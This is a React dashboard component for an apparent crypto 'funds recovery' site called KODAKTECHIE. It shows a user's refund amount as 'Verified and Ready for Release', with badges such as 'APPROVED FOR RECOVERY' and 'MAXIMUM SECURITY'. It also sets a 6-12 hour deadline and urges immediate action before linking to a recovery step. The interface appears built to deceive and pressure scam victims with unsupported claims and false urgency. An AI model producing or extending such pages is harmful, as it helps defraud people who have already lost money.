import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Shield, Wallet, ArrowRight, Clock, CheckCircle, AlertTriangle } from "lucide-react";
import { supabase } from "../supabaseClient"; 

const Dashboard = () => {
  const [user, setUser] = useState<any>(null);
  const [loading, setLoading] = useState(true); 
  const [error, setError] = useState<string | null>(null); 
  const navigate = useNavigate();

 useEffect(() => {
  const fetchUserData = async () => {
    try {
      const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();

      if (authError || !authUser) {
        navigate("/login");
        return;
      }

      const { data, error } = await supabase
        .from("profiles")
        .select("refundamount") // Use lowercase to match the column name
        .eq("id", authUser.id)
        .single();

      if (error) {
        throw error;
      }

      if (data) {
        setUser({ id: authUser.id, refundAmount: data.refundamount }); 
      } else {
        setError("No user data found");
        navigate("/login");
      }
    } catch (err) {
      console.error("Error fetching user data:", err);
      setError("Failed to fetch user data");
      navigate("/login");
    } finally {
      setLoading(false);
    }
  };

  fetchUserData();
}, [navigate]);

  // Handle logout
  const handleLogout = async () => {
    try {
      await supabase.auth.signOut();
      localStorage.removeItem("user"); 
      navigate("/login");
    } catch (err) {
      console.error("Error logging out:", err);
    }
  };

  // Show loading or error states
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  if (!user) return null;

  const handleProceedToRefund = () => {
    navigate("/recovery/step1");
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-crypto-dark to-crypto-darker">
      {/* Header */}
      <header className="border-b border-border/50 bg-card/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Shield className="h-8 w-8 text-primary" />
              <div>
                <h1 className="text-xl font-bold text-foreground">KODAKTECHIE</h1>
                <p className="text-sm text-primary">CRYPTO AND FUNDS RECOVERY</p>
              </div>
            </div>
            <Button
              variant="outline"
              onClick={handleLogout}
              className="border-border/50 hover:bg-secondary"
            >
              Logout
            </Button>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-4xl mx-auto space-y-8">
          {/* Welcome Section */}
          <div className="text-center space-y-4">
            <h1 className="text-3xl font-bold text-foreground">Welcome Back</h1>
            <p className="text-muted-foreground">
              Your crypto recovery case is ready for processing
            </p>
          </div>

          {/* Main Refund Card */}
          <Card className="bg-gradient-to-r from-card to-secondary border-primary/20 shadow-lg">
            <CardHeader className="text-center">
              <div className="flex justify-center mb-4">
                <div className="p-4 rounded-full bg-primary/20 border border-primary/30">
                  <Wallet className="h-12 w-12 text-primary" />
                </div>
              </div>
              <CardTitle className="text-2xl text-foreground">Your Refund Amount</CardTitle>
              <CardDescription>Available for immediate recovery</CardDescription>
            </CardHeader>
            <CardContent className="text-center space-y-6">
              <div className="space-y-2">
                <p className="text-5xl font-bold text-primary">${user.refundAmount}</p>
                <p className="text-sm text-muted-foreground">USDT</p>
              </div>

              <div className="flex items-center justify-center gap-2">
                <CheckCircle className="h-5 w-5 text-primary" />
                <span className="text-sm text-primary font-medium">Verified and Ready for Release</span>
              </div>

              <Button
                onClick={handleProceedToRefund}
                size="lg"
                className="bg-primary hover:bg-primary/90 text-primary-foreground font-semibold px-8 py-3"
              >
                Proceed to Refund Process
                <ArrowRight className="ml-2 h-5 w-5" />
              </Button>
            </CardContent>
          </Card>

          {/* Status Cards */}
          <div className="grid md:grid-cols-3 gap-6">
            <Card className="bg-card/80 border-border/50">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-2">
                  <CheckCircle className="h-5 w-5 text-primary" />
                  <CardTitle className="text-lg">Case Status</CardTitle>
                </div>
              </CardHeader>
              <CardContent>
                <Badge className="bg-primary/20 text-primary border-primary/30">
                  APPROVED FOR RECOVERY
                </Badge>
                <p className="text-sm text-muted-foreground mt-2">
                  Your case has been verified and approved for fund recovery
                </p>
              </CardContent>
            </Card>

            <Card className="bg-card/80 border-border/50">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-2">
                  <Clock className="h-5 w-5 text-orange-500" />
                  <CardTitle className="text-lg">Processing Time</CardTitle>
                </div>
              </CardHeader>
              <CardContent>
                <Badge variant="outline" className="border-orange-500/30 text-orange-500">
                  6-12 HOURS
                </Badge>
                <p className="text-sm text-muted-foreground mt-2">
                  Complete the process within the time limit to avoid session expiry
                </p>
              </CardContent>
            </Card>

            <Card className="bg-card/80 border-border/50">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-2">
                  <Shield className="h-5 w-5 text-primary" />
                  <CardTitle className="text-lg">Security Level</CardTitle>
                </div>
              </CardHeader>
              <CardContent>
                <Badge className="bg-primary/20 text-primary border-primary/30">
                  MAXIMUM SECURITY
                </Badge>
                <p className="text-sm text-muted-foreground mt-2">
                  End-to-end encryption and blockchain verification
                </p>
              </CardContent>
            </Card>
          </div>

          {/* Important Notice */}
          <Card className="bg-orange-500/10 border-orange-500/30">
            <CardContent className="pt-6">
              <div className="flex items-start gap-3">
                <AlertTriangle className="h-6 w-6 text-orange-500 mt-0.5" />
                <div>
                  <h3 className="font-semibold text-orange-500 mb-2">Important Notice</h3>
                  <p className="text-sm text-foreground">
                    To ensure the security of your funds and prevent unauthorized access,
                    the recovery process must be completed within the specified timeframe.
                    Our advanced security protocols require immediate action to maintain session integrity.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default Dashboard;